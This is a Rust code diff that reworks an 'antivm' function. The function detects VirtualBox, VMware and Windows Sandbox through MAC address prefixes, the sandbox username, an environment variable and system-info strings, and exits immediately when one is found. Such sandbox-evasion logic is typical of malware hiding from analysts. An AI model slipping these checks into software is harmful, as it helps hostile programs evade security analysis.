@@ -7,7 +7,15 @@ use std::process::Command;
 // if the current users name is WDAGUtilityAccount kill the program as fast as possible
 // if the system has vmtools installed kill the program
 
-pub fn kill() {
+pub fn antivm() {
+    // Check the MAC address
+    let pattern = Regex::new(r"^08:00:27|00:50:56|00:1C:14|00:0C:29|00:05:69").unwrap();
+    let mac_address = get_mac_address().unwrap_or_else(|_| "".to_string());
+    if pattern.is_match(&mac_address) {
+        println!("Running in VirtualBox/VMware (MAC address: {})", mac_address);
+        std::process::exit(0);
+    }
+
     // Windows Sandbox
     let user = whoami::username();
     if user == "WDAGUtilityAccount" {
@@ -18,14 +26,6 @@ pub fn kill() {
     // Check the environment variables
     if let Ok(version) = env::var("VBOX_VERSION") {
         println!("Running in VirtualBox virtual machine (version: {})", version);
-        std::process::exit(0);
-    }
-
-    // Check the MAC address
-    let pattern = Regex::new(r"^08:00:27|00:50:56|00:1C:14|00:0C:29|00:05:69").unwrap();
-    let mac_address = get_mac_address().unwrap_or_else(|_| "".to_string());
-    if pattern.is_match(&mac_address) {
-        println!("Running in VirtualBox/VMware (MAC address: {})", mac_address);
         std::process::exit(0);
     }
 
@@ -46,20 +46,10 @@ pub fn kill() {
 
     // Check for VirtualBox-specific system calls
     let system_info = get_system_info().unwrap_or_else(|_| "".to_string());
-    if system_info.contains("VirtualBox") {
-        println!("Running in VirtualBox");
+    if system_info.contains("VirtualBox") || system_info.contains("VMware") {
         std::process::exit(0);
     } else {
-        println!("Not running in VirtualBox");
-    }
-
-    // Check for VirtualBox-specific system calls
-    let system_info = get_system_info().unwrap_or_else(|_| "".to_string());
-    if system_info.contains("VMware") {
-        println!("Running in VMware");
-        std::process::exit(0);
-    } else {
-        println!("Not running in VMware");
+        println!("Not running in VirtualBox/VMware");
     }
 }
 
